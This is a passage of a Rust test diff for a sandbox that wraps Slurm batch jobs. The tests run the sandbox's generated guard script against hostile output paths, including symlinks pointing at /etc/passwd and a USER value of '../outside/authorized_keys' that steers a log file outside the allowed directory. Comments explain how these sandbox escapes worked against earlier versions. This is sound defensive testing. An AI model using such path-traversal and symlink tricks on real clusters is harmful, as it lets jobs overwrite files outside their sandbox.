+        // --- enforcer 1: the job guard, from the real emitted script ------------------
+        let guard = wrap_script(
+            BODY_PATH, &[], &FsPolicy::unchecked_for_test().compute_bwrap_args("/work/project"),
+            profile::Profile::SingleNode, "/work/project", false,
+            &["/work/project".to_string()], "", "",
+        );
+        let gs = guard.find("_husk_extra=()\n").expect("the guard's mask block must exist");
+        let ge = guard[gs..]
+            .find("\n# Bootstrap the step pair:")
+            .expect("the statement after the guard's mask block must exist");
+        let guard_src = &guard[gs..gs + ge];
+        assert!(guard_src.contains("done\n"), "slice must include the loop:\n{guard_src}");
+        assert!(
+            guard_src.contains("exit 1"),
+            "slice must include the refusal, or this test cannot see it:\n{guard_src}"
+        );
+        assert!(
+            guard_src.contains("resolves to an empty path"),
+            "the empty-resolution arm must exist in the guard even though no test can \
+             execute it:\n{guard_src}"
+        );
+
+        // --- enforcer 2: the rank cage, from the real emitted script ------------------
+        let rank_argv = crate::rank::wrap_command(
+            profile::Profile::SingleNode,
+            &FsPolicy::unchecked_for_test().rank_bwrap_args("/work/project"),
+            "/var/spool/slurmd",
+            std::process::id(),
+            None,
+            &["true".to_string()],
+        );
+        let rank = rank_argv[2].clone();
+        let rs = rank.find("_m=\n").expect("the rank's mask block must exist");
+        let re = rank[rs..].find("\n_s=").expect("the statement after the rank's mask block");
+        let rank_src = &rank[rs..rs + re];
+        assert!(rank_src.contains("exit 1"), "slice must include the rank's refusal");
+        assert!(
+            rank_src.contains("cannot be passed to bwrap as a single word"),
+            "the rank's empty/whitespace arm must exist:\n{rank_src}"
+        );
+
+        let list = |names: &[&str]| {
+            names
+                .iter()
+                .map(|n| settings::sh_quote(&dir.join(n).to_string_lossy()))
+                .collect::<Vec<_>>()
+                .join(" ")
+        };
+        // Run one slice and report (exit ok?, tokens, stderr).
+        let run = |sh: &str, src: &str, head: &str, paths: &str, emit: &str| {
+            let body = src.replace(
+                &format!("for {head} in {loop_head}; do"),
+                &format!("for {head} in {paths}; do"),
+            );
+            assert!(body.contains(paths), "path substitution failed for {head}");
+            let out = std::process::Command::new(sh)
+                .arg("-c")
+                .arg(format!("{body}\n{emit}\n"))
+                .output()
+                .unwrap();
+            let toks: Vec<String> = out
+                .stdout
+                .split(|b| *b == 0)
+                .filter(|t| !t.is_empty())
+                .map(|t| String::from_utf8_lossy(t).into_owned())
+                .collect();
+            (out.status.success(), toks, String::from_utf8_lossy(&out.stderr).into_owned())
+        };
+        let guard_emit =
+            "if [ ${#_husk_extra[@]} -gt 0 ]; then for w in \"${_husk_extra[@]}\"; do \
+             printf '%s\\0' \"$w\"; done; fi";
+        let rank_emit = "for w in $_m; do printf '%s\\0' \"$w\"; done";
+
+        // ---- the arms on which the two MUST agree -----------------------------------
+        for (name, paths, want_ok, want_toks) in [
+            ("only_absent", list(&["gone_a", "gone_b"]), true, Vec::new()),
+            (
+                "plain_and_dup",
+                list(&["plain", "link_dup"]),
+                true,
+                vec!["--tmpfs".to_string(), real_plain.clone()],
+            ),
+            ("not_a_directory", list(&["plain", "notdir"]), false, Vec::new()),
+        ] {
+            let (g_ok, g_toks, g_err) =
+                run("/bin/bash", guard_src, "_d", &paths, guard_emit);
+            assert_eq!(
+                g_ok, want_ok,
+                "{name}: the JOB GUARD took the wrong disposition (stderr: {g_err})"
+            );
+            assert_eq!(g_toks, want_toks, "{name}: job guard mask (stderr: {g_err})");
+            for sh in ["/bin/bash", "/bin/sh"] {
+                let (r_ok, r_toks, r_err) = run(sh, rank_src, "_c", &paths, rank_emit);
+                assert_eq!(
+                    r_ok, g_ok,
+                    "{name} under {sh}: THE TWO ENFORCERS OF THE MUNGE MASK DISAGREE — the \
+                     job guard {} and the rank {}. profile.rs calls this mount the \
+                     load-bearing control for the only shipped profile, so one of them is \
+                     running a job husk cannot confine, or refusing one it can.\n\
+                     guard stderr: {g_err}\nrank stderr: {r_err}",
+                    if g_ok { "accepted" } else { "refused" },
+                    if r_ok { "accepted" } else { "refused" },
+                );
+                assert_eq!(r_toks, want_toks, "{name} under {sh}: rank mask");
+                if !want_ok {
+                    // Same four properties from both, so the operator meets one story.
+                    for (who, err) in [("guard", &g_err), ("rank", &r_err)] {
+                        assert!(err.contains("notdir"), "{who} must name the path: {err}");
+                        assert!(err.contains("MUNGE"), "{who} must name the control: {err}");
+                        assert!(
+                            err.contains("Nothing your job did"),
+                            "{who} must say the job is not the cause: {err}"
+                        );
+                        assert!(
+                            err.contains("report the path above to your site"),
+                            "{who} must name who can fix it: {err}"
+                        );
+                    }
+                }
+            }
+        }
+
+        // ---- the one arm where they differ, BY DECISION ------------------------------
+        let paths = list(&["plain", "link_space"]);
+        let (g_ok, g_toks, g_err) = run("/bin/bash", guard_src, "_d", &paths, guard_emit);
+        assert!(
+            g_ok,
+            "a whitespace-resolving path is maskable in a bash ARRAY, so refusing it here \
+             would be an operator DoS husk does not need to inflict: {g_err}"
+        );
+        assert_eq!(g_toks.len(), 4, "the job cage must mask BOTH paths: {g_toks:?}");
+        assert!(
+            g_err.contains("resolves through whitespace") && g_err.contains("srun step"),
+            "the guard must announce, at job start, that every srun in this job will \
+             refuse — otherwise the operator meets the divergence as a job that works \
+             until it calls srun (P13): {g_err}"
+        );
+        for sh in ["/bin/bash", "/bin/sh"] {
+            let (r_ok, r_toks, _) = run(sh, rank_src, "_c", &paths, rank_emit);
+            assert!(!r_ok, "the rank cannot pass that path to bwrap, so it must refuse");
+            assert!(r_toks.is_empty(), "a refusing rank must emit no mask: {r_toks:?}");
+        }
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// **`K-1`.** Every `HUSK_` name the guard exports, it first unsets — and this reads the
+    /// emitted script to check, so a fifth exported name cannot join without joining the
+    /// `unset` too.
+    ///
+    /// `spool.rs` forwards the `HUSK_` prefix from the submitting shell, so each of these
+    /// names arrives in the job environment carrying whatever the login session had. `B4-3`
+    /// was that channel used against the egress pair. Fix `K` answered it in `step.rs`, by
+    /// checking the inherited value against this job; `RJMK`'s `K-1` observed that the
+    /// stronger move — remove the inheritance — was available. This is that move, at the
+    /// only layer that owns all four names.
+    ///
+    /// `P8`: the guard's export list and its unset list are two statements of one fact, so
+    /// one asserts the other rather than a comment asking to be maintained.
+    ///
+    /// **Mutations that turn it red:** deleting the `unset` line; dropping any one name from
+    /// it; adding an `export HUSK_X=` anywhere in the guard without extending it.
+    ///
+    /// **Axes it does not cover.** (1) It does not prove the *login-side* forwarding is
+    /// wrong to allow `HUSK_` — narrowing `spool::submit_env` is a second, independent fix in
+    /// a file this pass does not own, and it would make this line redundant rather than the
+    /// reverse. (2) `_HUSK_RESANDBOXED` is deliberately outside the rule: it is the re-exec
+    /// sentinel, read at the top of the guard, and clearing it would make the guard loop.
+    /// (3) It checks the guard's text, not a running job — a live job's environment is
+    /// `selftest.sh`'s question.
+    #[test]
+    fn every_husk_name_the_guard_exports_is_cleared_first() {
+        let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        for net in [false, true] {
+            let g = wrap_script(
+                BODY_PATH, &[], &FsPolicy::unchecked_for_test().compute_bwrap_args("/work/project"),
+                profile::Profile::SingleNode, "/work/project", net,
+                &["/work/project".to_string()], "", "",
+            );
+            let unset_line = g
+                .lines()
+                .find(|l| l.starts_with("unset HUSK_"))
+                .unwrap_or_else(|| panic!("the guard must clear its own HUSK_ names (net={net})"));
+            let cleared: Vec<&str> = unset_line["unset ".len()..].split_whitespace().collect();
+
+            // Every name the guard EXPORTS must be in that list...
+            for line in g.lines() {
+                let Some(rest) = line.trim_start().strip_prefix("export HUSK_") else {
+                    continue;
+                };
+                let name = format!("HUSK_{}", rest.split(['=', ' ']).next().unwrap_or(""));
+                assert!(
+                    cleared.contains(&name.as_str()),
+                    "the guard exports {name} but does not clear it first, so a value from \
+                     the submitting shell survives on any branch that does not set it — \
+                     which is exactly B4-3. Add it to the `unset` line (net={net})."
+                );
+            }
+            // ...and the clearing must come BEFORE the first export, or it undoes it.
+            let u = g.find("\nunset HUSK_").expect("unset must be a line of its own");
+            if let Some(e) = g.find("\nexport HUSK_") {
+                assert!(u < e, "the guard must clear before it exports (net={net})");
+            }
+            // The sentinel is not one of ours to clear.
+            assert!(
+                !cleared.contains(&"_HUSK_RESANDBOXED"),
+                "clearing the re-exec sentinel would make the guard loop"
+            );
+        }
+    }
+
+    /// **`M-4`.** The complete set of places that can put a `--tmpfs` on a bwrap command
+    /// line, enumerated — because `B2-1` and Fix `M` were both "the second producer nobody
+    /// looked at", and nothing failed when one appeared.
+    ///
+    /// `--tmpfs DEST` makes bwrap `mkdir DEST`, and by then the root is `--ro-bind`, so an
+    /// absent DEST is `bwrap: Can't mkdir …: Read-only file system` and **the cage does not
+    /// start**. There is no `--tmpfs-try`. That makes every producer a place a job can die,
+    /// and the input side is already mechanised (`settings::every_submit_time_shape_read_goes_through_one_function`)
+    /// while the EMISSION side was not.
+    ///
+    /// The true set, established by scanning the non-test, non-comment source at `a441428`
+    /// — and it is **nine emitting statements in three files**, not the six loops `RJMK`
+    /// counted or the two `FIX-M.md` reasoned about, because one of the nine is a *consumer*
+    /// and three of the settings.rs statements belong to one loop:
+    ///
+    /// | file | n | what, and why absent-DEST-safe |
+    /// |---|---|---|
+    /// | `settings.rs` | 7 | submit-time. Two static (`/tmp`, `/dev/shm`); the ops loop, governed by `drop_unmountable_hides`; the post-bind re-hide and the three auto-exec masks, all inside a writable root, where bwrap creates the DEST inside the bind (measured) |
+    /// | `policy.rs` | 2 | one EMITTER — the job guard's node-side credential loop — and one CONSUMER, the banner reading its own argument list back. A literal count that does not separate those two is not an enumeration |
+    /// | `rank.rs` | 1 | the rank cage's node-side credential loop |
+    ///
+    /// **The two node-side producers are tied to one definition**, which is `M-4`'s ask:
+    /// they read the same `settings::CREDENTIAL_SOCKET_DIRS`, they resolve on the node
+    /// rather than at submit (so `drop_unmountable_hides` cannot govern them), and after
+    /// `K-2` they take the same decision on the same input — asserted by execution in
+    /// `the_two_credential_mask_enforcers_agree_on_a_path_neither_can_mask`.
+    ///
+    /// **The seven in `settings.rs` are legitimately separate**, and merging them would be
+    /// wrong: they resolve at SUBMIT time on the login node, where the shape can be read and
+    /// the entry dropped, which is a safety argument the node-side pair cannot make and does
+    /// not need. What was missing was not one definition but this enumeration.
+    ///
+    /// **Axes it does not cover.** (1) It counts *statements*, not reachable emissions — a
+    /// producer inside dead code still counts. (2) `settings.rs` is another pass's file this
+    /// round (`M-1`/`M-2`); if that work adds or removes a producer this test is the thing
+    /// that says so, and the fix is one row of this table plus the sentence saying whether
+    /// the new DEST can be absent. (3) It cannot see a `--tmpfs` assembled from fragments
+    /// (`format!("--tmp{}", "fs")`); nothing does that today and the scan would miss it.
+    #[test]
+    fn every_producer_of_a_tmpfs_argument_is_enumerated() {
+        // (file, statements, why this count is what it is)
+        let table: &[(&str, &str, usize, &str)] = &[
+            ("settings.rs", include_str!("settings.rs"), 7,
+             "2 static + the ops loop + the post-bind re-hide + 3 auto-exec masks, all \
+              submit-time and all shape-checked or inside a writable root"),
+            ("policy.rs", include_str!("policy.rs"), 2,
+             "1 emitter (the job guard's node-side credential mask) + 1 consumer (the \
+              banner reads the argument list back)"),
+            ("rank.rs", include_str!("rank.rs"), 1,
+             "1 emitter (the rank cage's node-side credential mask)"),
+            ("srun.rs", include_str!("srun.rs"), 0, "the step table emits no mounts"),
+            ("step.rs", include_str!("step.rs"), 0,
+             "the step broker delegates every mount to rank.rs"),
+            ("sbatch.rs", include_str!("sbatch.rs"), 0, "options, not mounts"),
+            ("cage.rs", include_str!("cage.rs"), 0, "namespace paths, not mounts"),
+            ("session.rs", include_str!("session.rs"), 0, "no mounts"),
+            ("spool.rs", include_str!("spool.rs"), 0, "no mounts"),
+            ("netproxy.rs", include_str!("netproxy.rs"), 0, "no mounts"),
+            ("netallow.rs", include_str!("netallow.rs"), 0, "no mounts"),
+            ("config.rs", include_str!("config.rs"), 0, "no mounts"),
+            ("profile.rs", include_str!("profile.rs"), 0, "names the control, applies none"),
+            ("protocol.rs", include_str!("protocol.rs"), 0, "no mounts"),
+        ];
+        for (name, src, want, why) in table {
+            // `#[cfg(test)]\nmod tests`, not a bare `#[cfg(test)]`: settings.rs mentions
+            // the attribute in a doc comment at line 998 and policy.rs uses it inside a
+            // function, so the bare split silently truncated two files to nothing and this
+            // test reported `0` producers for the file that has seven. Same discriminator
+            // `settings::every_submit_time_shape_read_goes_through_one_function` uses.
+            let prod = src.split("#[cfg(test)]\nmod tests").next().unwrap();
+            let hits: Vec<&str> = prod
+                .lines()
+                .filter(|l| l.contains("--tmpfs"))
+                // Comments in BOTH languages: `//` is Rust, `#` is shell inside a
+                // generated-script literal, and the second kind is why a naive grep over
+                // this crate reports numbers nobody can act on.
+                .filter(|l| {
+                    let t = l.trim_start();
+                    !t.starts_with("//") && !t.starts_with('#')
+                })
+                .collect();
+            assert_eq!(
+                hits.len(), *want,
+                "{name} has {} statements mentioning --tmpfs outside a comment, not {want}.\n\
+                 This test IS the enumeration M-4 asked for: an absent --tmpfs DEST does not \
+                 degrade, it kills the cage before the job starts. If you added a producer \
+                 deliberately, add a row here saying whether its DEST can be absent and what \
+                 stops that; if you removed one, drop the count. Expected: {why}\nFound:\n{}",
+                hits.len(),
+                hits.join("\n"),
+            );
+        }
+    }
+
+    #[test]
+    fn golden_guard_without_egress() {
+        check_golden("guard-net-off.sh", &normalized_guard(false));
+    }
+
+    /// The emitted `--output`/`--error` name check, lifted verbatim out of a real generated
+    /// guard so it can be RUN.
+    ///
+    /// `D2-3`/`D2-4`: the oracle this replaces read `policy.rs` as text, so
+    /// shell-commenting one expander line kept it green while the guard stopped expanding
+    /// (B1-1, re-armed), and a behaviour-preserving reformat of one line made it accuse a
+    /// correct guard of the defect. Neither can happen to a test that executes the shell.
+    /// Same shape as `the_reclaim_removes_only_what_husk_created`, which exists because the
+    /// goldens pin this block's TEXT and nothing else — and `ROADMAP` Track `F2` is the
+    /// step that expires the goldens.
+    pub(crate) fn emitted_name_check(roots: &[String], out: &str, err: &str) -> String {
+        let guard = wrap_script(
+            BODY_PATH,
+            &[],
+            &FsPolicy::unchecked_for_test().compute_bwrap_args(&roots[0]),
+            profile::Profile::SingleNode,
+            &roots[0],
+            false,
+            roots,
+            out,
+            err,
+        );
+        guard
+            .split("# --- husk: the --output/--error paths husk emitted must still be safe")
+            .nth(1)
+            .and_then(|t| t.split_once('\n'))
+            .map(|(_, rest)| rest)
+            .and_then(|rest| rest.split("\n  _husk_step_pid=").next())
+            .expect("the guard must carry the emitted-path name check")
+            .to_string()
+    }
+
+    /// Run that block with a controlled environment and report what it did.
+    pub(crate) fn run_name_check(
+        block: &str,
+        log: &std::path::Path,
+        env: &[(&str, &str)],
+    ) -> (i32, String) {
+        let mut cmd = std::process::Command::new("bash");
+        cmd.arg("-c").arg(format!("_husk_log={}\n{block}\necho HUSK_FELL_THROUGH\n", shq(log)));
+        cmd.env_clear().env("PATH", std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".into()));
+        for (k, v) in env {
+            cmd.env(k, v);
+        }
+        let o = cmd.output().expect("bash must run");
+        let text = std::fs::read_to_string(log).unwrap_or_default()
+            + &String::from_utf8_lossy(&o.stdout)
+            + &String::from_utf8_lossy(&o.stderr);
+        (o.status.code().unwrap_or(-1), text)
+    }
+
+    fn shq(p: &std::path::Path) -> String {
+        format!("'{}'", p.to_string_lossy().replace('\'', "'\\''"))
+    }
+
+    /// The eight substitutions the guard makes, with values that are unmistakable in a name.
+    fn guard_env() -> Vec<(&'static str, &'static str)> {
+        vec![
+            ("SLURM_JOB_ID", "7001"),
+            ("SLURM_ARRAY_JOB_ID", "7002"),
+            ("SLURM_ARRAY_TASK_ID", "7003"),
+            ("SLURMD_NODENAME", "nid007"),
+            ("SLURM_NODEID", "7004"),
+            ("SLURM_LOCALID", "7005"),
+            ("SLURM_STEP_ID", "7006"),
+            ("USER", "u7007"),
+        ]
+    }
+
+    /// The value the guard's expander produces for `%c`, given `guard_env`.
+    fn guard_value(c: char) -> String {
+        let spec = settings::OUTPUT_SPECIFIERS
+            .iter()
+            .find(|s| s.spec() == c)
+            .expect("only table specifiers are probed");
+        let (expansion, name) = (spec.expansion(), spec.variable());
+        guard_env()
+            .iter()
+            .find(|(k, _)| *k == name)
+            .map(|(_, v)| (*v).to_string())
+            .unwrap_or_else(|| panic!("{expansion} names {name}, which guard_env does not set"))
+    }
+
+    #[test]
+    fn the_emitted_guard_expands_every_specifier_the_validator_accepts() {
+        // THE PAIRING, CHECKED BY BEHAVIOUR (`P8`, `P9`). For each specifier the submit-time
+        // validator accepts, the emitted shell must reduce a leaf using it to the SAME name
+        // slurmd would open. Two probes prove that jointly and neither proves it alone:
+        //
+        //   * a REGULAR file at the expanded name must be accepted — if the specifier were
+        //     not expanded, a `%` would survive and the fail-closed branch would refuse it;
+        //   * a SYMLINK at the expanded name must be refused — which the guard can only do
+        //     if it resolved to exactly that name, so this is what pins WHICH name.
+        //
+        // `M2a` (shell-comment one expander line) and `M6` (reformat one) both fail here,
+        // where the source-scraping probe passed the first and lied about the second.
+        let root = std::env::temp_dir().join(format!("husk-spec-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        let roots = vec![root.to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+
+        assert!(
+            !settings::OUTPUT_SPECIFIERS.is_empty(),
+            "the specifier table is empty — every probe below would pass vacuously (P10)"
+        );
+        for spec in settings::OUTPUT_SPECIFIERS {
+            let c = &spec.spec();
+            let leaf = format!("p%{c}q.log");
+            assert!(
+                settings::is_valid_output_filename(&leaf),
+                "{leaf} must be accepted at submit time, or this probe tests nothing"
+            );
+            let expanded = root.join(format!("p{}q.log", guard_value(*c)));
+            let block = emitted_name_check(&roots, &format!("{}/{leaf}", roots[0]), "");
+
+            // (a) a plain file at the expanded name -> the guard must be satisfied.
+            let _ = std::fs::remove_file(&expanded);
+            std::fs::write(&expanded, "log\n").unwrap();
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env());
+            assert!(
+                rc == 0 && text.contains("HUSK_FELL_THROUGH"),
+                "%{c} is accepted at submit time but the emitted guard refused a REGULAR \
+                 file at its expansion {expanded:?} — the guard did not expand it, so a \
+                 `%` survived into the leaf (B1-1). rc={rc}\n{text}"
+            );
+
+            // (b) a symlink at the expanded name -> the guard must refuse, which it can
+            //     only do by having resolved to exactly that name.
+            let _ = std::fs::remove_file(&expanded);
+            std::os::unix::fs::symlink("/etc/passwd", &expanded).unwrap();
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env());
+            assert!(
+                rc == 1 && text.contains("JOB REFUSED"),
+                "the emitted guard did not refuse a SYMLINK at %{c}'s expansion \
+                 {expanded:?}, so it is not checking the name slurmd will open. rc={rc}\n{text}"
+            );
+            let _ = std::fs::remove_file(&expanded);
+        }
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    /// Everything below runs the EMITTED bash. `guard_env()` supplies all eight variables,
+    /// so a test that wants an UNSET one has to remove it from that list explicitly.
+    fn guard_env_without(drop: &str) -> Vec<(&'static str, &'static str)> {
+        let kept: Vec<_> = guard_env().into_iter().filter(|(k, _)| *k != drop).collect();
+        assert_eq!(kept.len(), guard_env().len() - 1, "{drop} is not one of the eight");
+        kept
+    }
+
+    #[test]
+    fn a_specifier_whose_variable_is_unset_refuses_the_job_instead_of_dropping_it() {
+        // `RA-2`, the run-time half, and this is the defect the hardware found.
+        //
+        // MEASURED on Santis, a NON-array batch job:
+        //     sbatch --output=probe-A%A-a%a-s%s.log --wrap=true
+        //         -> probe-A837636-a4294967294-sbatch.log
+        // slurmd rendered %A as the JOB id and %a as 4294967294. `SLURM_ARRAY_JOB_ID` and
+        // `SLURM_ARRAY_TASK_ID` are unset on such a job, so `${SLURM_ARRAY_JOB_ID:-}`
+        // expanded to NOTHING and the guard computed `probe-A-a-sbatch.log`. A symlink at
+        // that name was refused; a symlink at the name slurmd actually opens was NOT, and
+        // neither was a HARD LINK there — so `N1`'s check was bypassed by the same route.
+        // Both leaf checks ran on a file that does not exist.
+        //
+        // The false friend: `the_emitted_guard_expands_every_specifier_the_validator_accepts`
+        // sets all eight variables, which is precisely the substitution that hides this. It
+        // stays green whether the table is right or wrong.
+        let root = std::env::temp_dir().join(format!("husk-unset-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        let roots = vec![root.to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+
+        // The real filename from the measurement, planted as the symlink the escape needs.
+        // The guard must never reach the point of being satisfied by its absence.
+        std::os::unix::fs::symlink("/etc/passwd", root.join("probe-A837636-a4294967294-sbatch.log"))
+            .unwrap();
+        let leaf = "probe-A%A-a%a-s%s.log";
+        let block = emitted_name_check(&roots, &format!("{}/{leaf}", roots[0]), "");
+
+        let _ = std::fs::remove_file(&log);
+        let (rc, text) = run_name_check(&block, &log, &guard_env_without("SLURM_ARRAY_JOB_ID"));
+        assert_eq!(
+            rc, 1,
+            "with SLURM_ARRAY_JOB_ID unset the guard cannot name the file slurmd opens, so \
+             it must refuse. Exit 0 means it checked `probe-A-a-sbatch.log` instead and was \
+             satisfied that the file it named is absent — while the file slurmd opens is a \
+             symlink to /etc/passwd.\n{text}"
+        );
+        assert!(
+            text.contains("SLURM_ARRAY_JOB_ID") && text.contains("%A"),
+            "the refusal must name the specifier and the variable it needs (`P11`).\n{text}"
+        );
+
+        // Every empty-fallback specifier gets the same treatment, and the table decides
+        // which those are — so adding one with an empty default cannot forget this.
+        for spec in settings::OUTPUT_SPECIFIERS.iter().filter(|s| s.unset_is_unnameable()) {
+            let leaf = format!("x%{}.log", spec.spec());
+            let block = emitted_name_check(&roots, &format!("{}/{leaf}", roots[0]), "");
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env_without(spec.variable()));
+            assert_eq!(
+                rc, 1,
+                "%{} expands to nothing when {} is unset, so the guard would check a SHORTER \
+                 name than the one slurmd opens — and neither leaf check would run on the \
+                 real file.\n{text}",
+                spec.spec(),
+                spec.variable()
+            );
+            // …and it must still SUBMIT when the variable is there, or this is a denial of
+            // service rather than a control.
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env());
+            assert_eq!(rc, 0, "%{} with its variable set must pass\n{text}", spec.spec());
+        }
+
+        // A specifier with a REAL default is left alone: `${SLURM_STEP_ID:-batch}` is a
+        // deliberate stand-in and refusing on it would contradict the table.
+        for spec in settings::OUTPUT_SPECIFIERS.iter().filter(|s| !s.unset_is_unnameable()) {
+            let leaf = format!("y%{}.log", spec.spec());
+            let block = emitted_name_check(&roots, &format!("{}/{leaf}", roots[0]), "");
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env_without(spec.variable()));
+            assert_eq!(
+                rc, 0,
+                "%{} has a non-empty default, so an unset {} is not the unnameable case and \
+                 must not refuse\n{text}",
+                spec.spec(),
+                spec.variable()
+            );
+        }
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn an_expanded_value_carrying_a_slash_or_a_percent_is_refused_by_the_guard() {
+        // `RA-1`. `D2-6` closed the case where a substituted value carries a `%` — the leaf
+        // becomes unnameable and the guard fails closed. One character to the left is
+        // strictly worse: a `/` does not make the leaf unnameable, it MOVES it, past a
+        // containment check that already ran on the directory.
+        //
+        //     USER=../outside/authorized_keys   --output=%u.log
+        //     -> guard leaf <root>/../outside/authorized_keys.log   OUTSIDE the writable set
+        //     -> rc=0, body runs, nothing logged
+        let root = std::env::temp_dir().join(format!("husk-ra1-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(root.join("work")).unwrap();
+        std::fs::create_dir_all(root.join("outside")).unwrap();
+        let roots = vec![root.join("work").to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+        let block = emitted_name_check(&roots, &format!("{}/%u.log", roots[0]), "");
+
+        for (user, why) in [
+            ("../outside/authorized_keys", "an expanded value contains a /"),
+            ("c%mueller", "a % specifier survived expansion"),
+        ] {
+            let mut env = guard_env_without("USER");
+            env.push(("USER", user));
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &env);
+            assert_eq!(rc, 1, "USER={user} must refuse the job\n{text}");
+            assert!(text.contains(why), "the refusal must say which: expected {why:?}\n{text}");
+        }
+
+        // …and an ordinary user name still submits, so this is a refusal of the `/` and not
+        // of `%u`.
+        let mut env = guard_env_without("USER");
+        env.push(("USER", "u7007"));
+        let _ = std::fs::remove_file(&log);
+        let (rc, text) = run_name_check(&block, &log, &env);
+        assert_eq!(rc, 0, "an ordinary user name must still pass\n{text}");
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_percent_in_a_directory_component_reaches_the_guard_and_is_refused() {
+        // `RA-9`/`P3`. The submit-time check refuses a `%` in a directory component, and
+        // `_husk_name_bad`'s own first comment states that as an ASSUMPTION — "may carry
+        // SLURM % specifiers in the LEAF only". The run-time half exists for the case where
+        // the assumption fails (a stale broker binary is the example `FIX-A` gives), and
+        // that is exactly the case where a `%` directory arrives. `readlink -f` resolves the
+        // LITERAL `%x` directory, which is a real directory inside the writable set, so
+        // every check below it passed while slurmd opened somewhere else entirely.
+        let root = std::env::temp_dir().join(format!("husk-ra9-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(root.join("%x")).unwrap();
+        let roots = vec![root.to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+
+        let block = emitted_name_check(&roots, &format!("{}/%x/slurm-%j.out", roots[0]), "");
+        let _ = std::fs::remove_file(&log);
+        let (rc, text) = run_name_check(&block, &log, &guard_env());
+        assert_eq!(rc, 1, "a `%` in a DIRECTORY component must refuse the job\n{text}");
+        assert!(
+            text.contains("its directory holds a %"),
+            "the refusal must name the directory, not the leaf (`P11`)\n{text}"
+        );
+
+        // The same path with a `%`-free directory still submits.
+        std::fs::create_dir_all(root.join("plain")).unwrap();
+        let block = emitted_name_check(&roots, &format!("{}/plain/slurm-%j.out", roots[0]), "");
+        let _ = std::fs::remove_file(&log);
+        let (rc, text) = run_name_check(&block, &log, &guard_env());
+        assert_eq!(rc, 0, "a %-free directory must still pass\n{text}");
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn the_emitted_expander_runs_in_the_tables_order() {
+        // `RA-4`. `OUTPUT_SPECIFIERS`' docstring says "Order is the guard's substitution
+        // order", the author's own mutation showed order is load-bearing, and yet
+        // `.iter()` -> `.iter().rev()` in the generator turned NOTHING red but the
+        // byte-goldens. Two independent oracles here, because one of them is a comparison
+        // against the table and the table cannot be its own oracle.
+        //
+        // (1) BEHAVIOUR, table-independent. `%u` runs LAST because USER is the one
+        //     substituted value that could itself contain a `%j`, and a `%j` pass that has
+        //     already run will not re-scan it. In the shipped order the leaf keeps its `%`
+        //     and the fail-closed branch refuses. Reversed, `%j` runs after `%u` and
+        //     rewrites the value SLURM will not rewrite, producing a name slurmd never
+        //     opens with no `%` left for the fail-close to catch.
+        let root = std::env::temp_dir().join(format!("husk-order-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        let roots = vec![root.to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+        let block = emitted_name_check(&roots, &format!("{}/x%u.log", roots[0]), "");
+        let mut env = guard_env_without("USER");
+        env.push(("USER", "c%jueller"));
+        let (rc, text) = run_name_check(&block, &log, &env);
+        assert_eq!(
+            rc, 1,
+            "a `%j` arriving INSIDE a substituted value must survive to the fail-closed \
+             branch — if it does not, a later pass rewrote a value slurmd leaves alone and \
+             the guard is checking a name slurmd never opens\n{text}"
+        );
+        let _ = std::fs::remove_dir_all(&root);
+
+        // (2) …and the emitted line ORDER is the table's order, which is what the docstring
+        //     promises and what a reader of the golden will assume.
+        let guard = normalized_guard(false);
+        let emitted: Vec<char> = guard
+            .lines()
+            .filter_map(|l| l.trim().strip_prefix("_husk_nl=${_husk_nl//'%"))
+            .filter_map(|r| r.chars().next())
+            .collect();
+        let table: Vec<char> = settings::OUTPUT_SPECIFIERS.iter().map(|s| s.spec()).collect();
+        assert_eq!(
+            emitted, table,
+            "the guard substitutes in a different order from the table it is generated \
+             from; `%u` must stay last"
+        );
+    }
+
+    #[test]
+    fn an_output_leaf_husk_cannot_expand_is_refused_and_does_not_disarm_the_error_check() {
+        // B1-1 ITSELF, end to end, at the level the bug lived (`P9`).
+        //
+        // At HEAD the guard's unmodelled branch `return 1`ed (= not bad) and set
+        // `_husk_name_unverified`, which the caller consumed on the NEXT loop iteration to
+        // `continue` past a genuine refusal. Loop order is --output then --error, so
+        // `--output=…%J.out` with a symlinked `--error` leaf exited 0, ran the body, and
+        // printed NOTHING — the refusal and the warning both gone (`P7`).
+        //
+        // Both halves are now closed and this asserts BOTH: the unmodelled path is itself
+        // refused, and no path can excuse a later one.
+        let root = std::env::temp_dir().join(format!("husk-disarm-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        let roots = vec![root.to_string_lossy().to_string()];
+        let log = root.join("guard.log");
+
+        // The A1-F1 scenario: --error's leaf swapped to a symlink outside the set while the
+        // job sat PENDING. slurmd opens it as the user, outside the cage.
+        std::os::unix::fs::symlink("/etc/passwd", root.join("e.log")).unwrap();
+
+        // The unmodelled leaf, first in the loop. `%J` is the one B1 found; `%%` is the
+        // four-character one that needed no knowledge of any gap. Both are refused at
